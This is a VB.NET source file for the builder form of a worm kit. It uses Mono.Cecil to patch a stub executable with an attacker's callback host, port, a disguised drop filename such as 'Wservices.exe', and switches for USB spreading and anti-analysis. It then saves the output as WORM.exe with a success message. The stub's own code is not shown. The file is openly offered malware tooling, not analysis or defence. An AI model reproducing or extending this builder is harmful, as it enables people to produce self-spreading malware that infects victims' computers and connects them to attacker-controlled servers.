Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Builder

    Private Sub ChButton1_Click(sender As Object, e As EventArgs) Handles ChButton1.Click

        If (EXE.Text = "") Then
            EXE.Text = "Wservices.exe"
        End If

        If PATH1.Text = "" Then
            PATH1.Text = "Temp"
        End If

        If Not EXE.Text.EndsWith(".exe") Then
            EXE.Text = EXE.Text + ".exe"
        End If

        If (PATH2.Text = "") Then
            PATH2.Text = Nothing
        End If

        If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (HOST1.Text = "") Then
            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (PORT.Text = "") Then
            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
            Return
        Else
            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%HOST1%") Then
                                                current.Operand = HOST1.Text
                                            End If
                                            If (str = "%HOST2%") Then
                                                current.Operand = HOST2.Text
                                            End If
                                            If (str = "%PORT%") Then
                                                current.Operand = PORT.Text
                                            End If
                                            If (str = "%EXE%") Then
                                                current.Operand = EXE.Text
                                            End If
                                            If (str = "%DROP%") Then
                                                current.Operand = DROP.Checked.ToString
                                            End If
                                            If (str = "%PATH1%") Then
                                                current.Operand = PATH1.Text
                                            End If
                                            If (str = "%PATH2%") Then
                                                current.Operand = PATH2.Text
                                            End If
                                            If (str = "%USB%") Then
                                                current.Operand = USB.Checked.ToString
                                            End If
                                            If (str = "%ANTI%") Then
                                                current.Operand = ANTI.Checked.ToString
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(Application.StartupPath + "\" + "WORM.exe")
                MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                My.Settings.Save()
                Me.Close()
            Catch ex1 As Exception
                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                Return
            End Try
        End If
    End Sub

    Private Sub DROP_CheckedChanged(sender As Object) Handles DROP.CheckedChanged

        If DROP.Checked = True Then
            EXE.Enabled = True
            PATH1.Enabled = True
            PATH2.Enabled = True
        Else
            EXE.Enabled = False
            PATH1.Enabled = False
            PATH2.Enabled = False
        End If
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        EXE.Enabled = False
        PATH1.Enabled = False
        DROP.Checked = False
        PATH2.Enabled = False
    End Sub

    Private Sub PATH2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub PATH1_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub EXE_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub HOST_TextChanged(sender As Object, e As EventArgs)

    End Sub
End Class